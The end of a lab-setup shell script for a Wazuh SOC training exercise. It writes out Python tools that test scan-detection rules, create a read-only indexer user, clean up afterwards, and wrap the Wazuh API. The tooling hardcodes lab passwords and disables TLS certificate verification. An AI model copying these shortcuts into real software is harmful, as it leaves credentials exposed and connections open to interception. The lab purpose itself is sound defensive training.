        ("V2 trung gian lv3, different_dstip",        (3, "dstip", "mid")),
        ("V3 trung gian lv3, khong 'khac dich'",      (3, None, "mid")),
        ("V4 trung gian lv3, different_field dstip",  (3, "field", "mid")),
        ("V5 trung gian lv1, different_dstip",        (1, "dstip", "mid")),
    ]
    print("== S-B2: R-B tan suat - moi bien the: nap -> restart -> logtest 4 kich ban (12 dong/kich ban)\n")
    out = {}
    for name, args in V:
        xml = rb_variant(*args)
        e = put_try(w, xml)
        if e:
            print("%-44s TU CHOI %s" % (name, e)); continue
        okv, msg = w.validate()
        if not okv:
            print("%-44s KHONG HOP LE %s" % (name, msg[:100])); continue
        w.restart()
        row = []
        for cname, ls, exp in cases:
            tok = None; ids = []
            for l in ls:
                tok, o = w.logtest(l, tok, location=LOGF)
                ids.append((o.get("rule") or {}).get("id"))
            w.logtest_close(tok)
            fired = "100340" in ids
            row.append("%s:%s%s" % (cname, "NO" if fired else "-", "" if fired == exp else "(SAI)"))
            out.setdefault(name, {})[cname] = {"fired": fired, "first": ids.index("100340") + 1 if fired else None,
                                                "last_ids": ids[-3:]}
        print("%-44s %s" % (name, "  ".join(row)))
        for cname, r in out[name].items():
            if r["fired"]:
                print("      %-18s no o dong thu %s" % (cname, r["first"]))
    state({"sb2": out})
    print("\nMong doi: 'quet 12 dich' NO, '1 dich x12' -, 'sao luu dung cong' -, 'sao luu sai cong' NO (khong co (SAI)).")


# ------------------------------------------------------------------ S-C
def admin_pw():
    t = open("/root/wazuh-admin-credentials.txt").read()
    return re.search(r"indexer_password:\s*'([^']+)'", t).group(1)


def ix(method, path, body=None, user="admin", pw=None, base="https://127.0.0.1:9200", nd=False, hdr=None):
    pw = pw or admin_pw()
    data = None
    if body is not None:
        data = (body if isinstance(body, str) else json.dumps(body)).encode()
    req = urllib.request.Request(base + path, data=data, method=method)
    req.add_header("Authorization", "Basic " + base64.b64encode(("%s:%s" % (user, pw)).encode()).decode())
    req.add_header("Content-Type", "application/x-ndjson" if nd else "application/json")
    for k, v in (hdr or {}).items():
        req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, context=_CTX, timeout=30) as r:
            return r.status, json.loads(r.read().decode() or "{}")
    except urllib.error.HTTPError as e:
        return e.code, (e.read().decode()[:300])
    except Exception as e:  # noqa: BLE001
        return 0, str(e)[:300]


def do_sc():
    print("== S-C: indexer + user chi-doc + index pattern")
    res = {}
    c, h = ix("GET", "/_cluster/health"); res["health"] = (c, h.get("status") if isinstance(h, dict) else h)
    print("   cluster health          :", res["health"])
    idx = "wazuh-alerts-4.x-" + time.strftime("%Y.%m.%d")
    now = time.strftime("%Y-%m-%dT%H:%M:%S.000+0000", time.gmtime())
    doc = {"@timestamp": now, "timestamp": now, "agent": {"id": "000", "name": "siem"},
           "manager": {"name": "siem"}, "rule": {"id": "100399", "level": 12, "description": "SPIKE18 ticket thu",
           "groups": ["soc_queue"]}, "data": {"ticket": "SPIKE-1", "srcip": "203.0.113.7"},
           "predecoder": {"hostname": "web-shop"}, "location": "spike18", "full_log": "spike18"}
    bulk = json.dumps({"index": {"_index": idx}}) + "\n" + json.dumps(doc) + "\n"
    c, r = ix("POST", "/_bulk?refresh=true", bulk, nd=True)
    errs = r.get("errors") if isinstance(r, dict) else r
    res["bulk"] = (c, errs); print("   bulk vao %s : HTTP %s errors=%s" % (idx, c, errs))
    c, r = ix("POST", "/wazuh-alerts-*/_search", {"query": {"term": {"data.ticket": "SPIKE-1"}}})
    hits = r.get("hits", {}).get("total", {}).get("value") if isinstance(r, dict) else r
    res["search"] = hits; print("   tim lai data.ticket     :", hits, "(mo Discover, tim data.ticket:SPIKE-1)")
    for i in ("soc-shift-spike", "soc-shift-gt-spike"):
        ix("PUT", "/" + i); ix("POST", "/%s/_doc?refresh=true" % i, {"t0": int(time.time()), "note": i})
    role = {"cluster_permissions": ["cluster_composite_ops_ro"],
            "index_permissions": [{"index_patterns": ["wazuh-alerts-*", "ctx-*", "soc-shift-spike"],
                                   "allowed_actions": ["read", "indices:admin/mappings/get"]}]}
    c1, _ = ix("PUT", "/_plugins/_security/api/roles/spike18_ro", role)
    c2, r2 = ix("PUT", "/_plugins/_security/api/internalusers/spike18_analyst", {"password": "Spike.Analyst.2026!", "backend_roles": []})
    c3, _ = ix("PUT", "/_plugins/_security/api/rolesmapping/spike18_ro", {"users": ["spike18_analyst"]})
    res["users"] = (c1, c2, c3); print("   tao role/user/mapping   : HTTP %s %s %s %s" % (c1, c2, c3, "" if c2 in (200, 201) else r2))
    time.sleep(2)
    for target, base in (("indexer :9200", "https://172.20.0.20:9200"),):
        ca, _ = ix("POST", "/soc-shift-spike/_search", {}, user="spike18_analyst", pw="Spike.Analyst.2026!", base=base)
        cb, _ = ix("POST", "/soc-shift-gt-spike/_search", {}, user="spike18_analyst", pw="Spike.Analyst.2026!", base=base)
        res["ro_" + target] = (ca, cb)
        print("   analyst doc soc-shift (%s): %s   doc soc-shift-gt: %s (mong doi 200 / 403)" % (target, ca, cb))
    c, r = ix("POST", "/api/saved_objects/index-pattern/spike18-ctx", {"attributes": {"title": "ctx-spike*", "timeFieldName": "@timestamp"}},
              base="https://127.0.0.1", hdr={"osd-xsrf": "true"})
    res["index_pattern"] = c; print("   tao index pattern (dashboard API): HTTP %s %s" % (c, "" if c in (200, 409) else str(r)[:150]))
    state({"sc": res})
    print("\nTu DEFENDER kiem them (doi IP neu khac):")
    print("   curl -sk -u 'spike18_analyst:Spike.Analyst.2026!' https://172.20.0.20:9200/soc-shift-spike/_search | head -c 300")


# ------------------------------------------------------------------ cleanup
def do_cleanup():
    st = state()
    if conf_del_localfile():
        print("   go <localfile> spike")
    c = open(OSSEC + "/etc/ossec.conf").read()
    c2 = c.replace("\n    <list>etc/lists/spike18-hosts</list>\n    <list>etc/lists/spike18-ports</list>", "")
    if c2 != c:
        open(OSSEC + "/etc/ossec.conf", "w").write(c2); print("   go khai bao list spike")
    if "orig_rules" in st:
        try:
            w = api(); w.put_rule_file("local_rules.xml", st["orig_rules"]); print("   tra lai local_rules.xml")
        except WazuhError as e:
            print("   KHONG tra lai duoc local_rules.xml:", e)
    for n in ("spike18-hosts", "spike18-ports"):
        p = OSSEC + "/etc/lists/" + n
        if os.path.exists(p):
            os.remove(p)
    for p in ("/soc-shift-spike", "/soc-shift-gt-spike", "/_plugins/_security/api/internalusers/spike18_analyst",
              "/_plugins/_security/api/rolesmapping/spike18_ro", "/_plugins/_security/api/roles/spike18_ro"):
        ix("DELETE", p)
    ix("POST", "/wazuh-alerts-*/_delete_by_query?refresh=true", {"query": {"term": {"data.ticket": "SPIKE-1"}}})
    ix("DELETE", "/api/saved_objects/index-pattern/spike18-ctx", base="https://127.0.0.1", hdr={"osd-xsrf": "true"})
    print("   xoa index/user/doc spike; restart manager ...", "OK" if restart() else "CHUA LEN")
    if os.path.exists(STATE):
        os.rename(STATE, STATE + ".done")


if __name__ == "__main__":
    cmd = sys.argv[1] if len(sys.argv) > 1 else ""
    fn = {"sa": do_sa, "sa-live": do_sa_live, "sb": do_sb, "sb2": do_sb2, "sc": do_sc, "cleanup": do_cleanup}.get(cmd)
    if not fn:
        print("Dung: python3 spike18.py sa | sa-live | sb | sb2 | sc | cleanup"); sys.exit(1)
    fn()
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/tools/spike"
cat > "$LAB/tools/spike/wzapi.py" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
#!/usr/bin/env python3
# ============================================================================
# wzapi.py - client toi gian cho Wazuh API (cong 55000). Chi dung thu vien chuan.
# Dung chung cho: kiem-thu-luat, thu-dong, replay.py (defender) va grade (siem).
#
# Cau hinh (bien moi truong, co mac dinh cho lab):
#   WZ_API_URL   (mac dinh https://172.20.0.20:55000)
#   WZ_API_USER  (mac dinh bai17-tool)
#   WZ_API_PASS  (mac dinh xem DEFAULT_PASS)
# ============================================================================
import base64, json, os, ssl, time, urllib.error, urllib.parse, urllib.request

DEFAULT_URL = "https://172.20.0.20:55000"
DEFAULT_USER = "soc-tool"
DEFAULT_PASS = "Soc.Tool.2026!"

_CTX = ssl.create_default_context()
_CTX.check_hostname = False
_CTX.verify_mode = ssl.CERT_NONE


class WazuhError(Exception):
    pass


class Wazuh:
    def __init__(self, url=None, user=None, password=None, timeout=30):
        self.url = (url or os.environ.get("WZ_API_URL") or DEFAULT_URL).rstrip("/")
        self.user = user or os.environ.get("WZ_API_USER") or DEFAULT_USER
        self.password = password or os.environ.get("WZ_API_PASS") or DEFAULT_PASS
        self.timeout = timeout
        self.token = None

    # ---------------- tang thap ----------------
    def _req(self, method, path, body=None, raw=None, ctype="application/json", auth=True, params=None, _try=0):
        url = self.url + path
        if params:
            url += "?" + urllib.parse.urlencode(params)
        data = None
        if raw is not None:
            data = raw if isinstance(raw, bytes) else raw.encode("utf-8")
        elif body is not None:
            data = json.dumps(body).encode("utf-8")
        req = urllib.request.Request(url, data=data, method=method)
        req.add_header("Content-Type", ctype)
        if auth:
            if not self.token:
                self.login()
            req.add_header("Authorization", "Bearer " + self.token)
        try:
            with urllib.request.urlopen(req, context=_CTX, timeout=self.timeout) as r:
                txt = r.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            txt = e.read().decode("utf-8", "replace")
            if e.code == 401 and auth and self.token:
                # token het han -> dang nhap lai 1 lan
                self.token = None
                return self._req(method, path, body, raw, ctype, auth, params)
            if e.code == 500 and '"error": 3021' in txt and _try < 3:
                # 3021 = "Timeout executing API request": may ao qua tai, manager cham -> thu lai
                time.sleep(5 * (_try + 1))
                return self._req(method, path, body, raw, ctype, auth, params, _try + 1)
            raise WazuhError("HTTP %s %s %s: %s" % (e.code, method, path, txt[:400]))
        except Exception as e:
            raise WazuhError("%s %s: %s" % (method, path, e))
        try:
            return json.loads(txt) if txt else {}
        except ValueError:
            return {"raw": txt}

    def login(self):
        url = self.url + "/security/user/authenticate"
        req = urllib.request.Request(url, data=b"", method="POST")
        cred = base64.b64encode(("%s:%s" % (self.user, self.password)).encode()).decode()
        req.add_header("Authorization", "Basic " + cred)
        try:
            with urllib.request.urlopen(req, context=_CTX, timeout=self.timeout) as r:
                self.token = json.loads(r.read().decode())["data"]["token"]
        except urllib.error.HTTPError as e:
            raise WazuhError("Dang nhap API that bai (HTTP %s) - API chua san sang hoac sai tai khoan" % e.code)
        except Exception as e:
            raise WazuhError("Khong ket noi duoc Wazuh API %s: %s" % (self.url, e))
        return self.token

    # ---------------- ruleset ----------------
    def get_rule_file(self, name):
        r = self._req("GET", "/rules/files/" + name, params={"raw": "true"})
        return r.get("raw", "") if isinstance(r, dict) else r

    @staticmethod
    def _check_items(r, what):
        """API tra HTTP 200 ca khi KHONG ghi duoc file: loi nam trong data.failed_items."""
        d = (r or {}).get("data") or {}
        fails = d.get("failed_items") or []
        if fails or (d.get("total_affected_items") == 0 and "affected_items" in d):
            raise WazuhError("Wazuh KHONG ghi %s: %s" % (what, json.dumps(fails or r, ensure_ascii=False)[:500]))
        return r

    def put_rule_file(self, name, content):
        return self._check_items(self._req("PUT", "/rules/files/" + name, raw=content,
                                 ctype="application/octet-stream", params={"overwrite": "true"}), name)

    def put_list_file(self, name, content):
        return self._check_items(self._req("PUT", "/lists/files/" + name, raw=content,
                                 ctype="application/octet-stream", params={"overwrite": "true"}), name)

    # ---------------- manager ----------------
    def validate(self):
        """Tra ve (ok, thong_bao)."""
        r = self._req("GET", "/manager/configuration/validation")
        items = (r.get("data") or {}).get("affected_items") or []
        for it in items:
            if it.get("status") != "OK":
                return False, json.dumps(it.get("details", it), ensure_ascii=False)[:800]
        fails = (r.get("data") or {}).get("failed_items") or []
        if fails:
            return False, json.dumps(fails, ensure_ascii=False)[:800]
        return True, "OK"

    def restart(self, wait=240):
        """PUT /manager/restart chi XEP LICH restart (bat dong bo): vai giay dau /manager/status van
        bao tien trinh CU 'running' -> neu tra ve luc do, phat lai se chay tren bo luat CU.
        Phai thay manager XUONG (API mat ket noi / analysisd khong running) roi moi cho no LEN lai."""
        self._req("PUT", "/manager/restart")
        t0 = time.time()
        seen_down = False
        while time.time() - t0 < wait:
            time.sleep(3)
            try:
                self.token = None
                st = self._req("GET", "/manager/status")
                items = (st.get("data") or {}).get("affected_items") or [{}]
                up = items[0].get("wazuh-analysisd") == "running"
            except WazuhError:
                up = False
            if not up:
                seen_down = True
            elif seen_down or time.time() - t0 > 60:
                # da thay xuong roi len (hoac qua 60s ma khong bat duoc luc xuong) -> cho analysisd nap xong
                time.sleep(10)
                return True
        return False

    # ---------------- logtest ----------------
    def logtest(self, event, token=None, location="/var/log/auth.log", log_format="syslog"):
        body = {"event": event, "log_format": log_format, "location": location}
        if token:
            body["token"] = token
        r = self._req("PUT", "/logtest", body=body)
        d = r.get("data") or {}
        return d.get("token"), d.get("output") or {}

    def logtest_close(self, token):
        if not token:
            return
        try:
            self._req("DELETE", "/logtest/sessions/" + token)
        except WazuhError:
            pass
__EOF_LAB_SOC_SHIFT_CAPSTONE__
echo ">> Cap quyen thuc thi + chuan hoa EOL (LF)"
chmod +x "$LAB/defender/_bin/fixlocal.sh"
chmod +x "$LAB/defender/_bin/prestop"
chmod +x "$LAB/defender/_bin/student_startup.sh"
chmod +x "$LAB/defender/_system/usr/local/bin/goi-y"
chmod +x "$LAB/defender/_system/usr/local/bin/kiem-thu-luat"
chmod +x "$LAB/defender/_system/usr/local/bin/thu-dong"
chmod +x "$LAB/defender/_system/usr/local/bin/trang-thai"
chmod +x "$LAB/defender/_system/usr/local/lib/soc-tools/replay.py"
chmod +x "$LAB/defender/_system/usr/local/sbin/bai18-khoa-quyen"
chmod +x "$LAB/defender/_system/usr/local/sbin/bai18-thu-thap"
chmod +x "$LAB/defender/_system/usr/local/sbin/bai18-watcher"
chmod +x "$LAB/siem/_bin/fixlocal.sh"
chmod +x "$LAB/siem/_bin/prestop"
chmod +x "$LAB/siem/bai18/lib/replay.py"
find "$LAB" -type f -exec sed -i 's/\r$//' {} +
echo ">> XONG. Tiep theo:  cd \$LABTAINER_DIR/scripts/labtainer-student && rebuild soc-shift-capstone"
